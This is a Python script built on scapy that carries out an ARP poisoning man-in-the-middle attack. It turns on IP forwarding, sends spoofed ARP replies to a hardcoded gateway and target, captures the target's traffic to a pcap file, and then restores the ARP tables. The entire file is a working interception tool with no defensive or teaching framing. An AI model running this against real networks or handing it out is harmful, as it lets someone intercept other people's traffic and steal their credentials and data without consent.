# -*- coding: utf-8 -*-

from scapy.all import *
import os
import signal
import sys
import threading
import time

gateway_ip = "192.168.1.1"
target_ip = "192.168.1.52"
packet_count = 1000
conf.iface = "en0"
conf.verb = 0

def get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.inet.ip.forwarding=0")
    os.kill(os.getpid(), signal.SIGTERM)

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        
def handle_packet(packet):
    print packet

print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
os.system("sysctl -w net.inet.ip.forwarding=1")
print("[*] Gateway IP address: " + gateway_ip)
print("[*] Target IP address: " + target_ip)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: " + gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: " + target_mac)

poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    sniff_filter = "ip host " + target_ip
    print("[*] Starting network capture. Packet Count: " + str(packet_count) + ". Filter: " + sniff_filter)
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count, prn=handle_packet)
    wrpcap(target_ip + "_capture.pcap", packets)
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)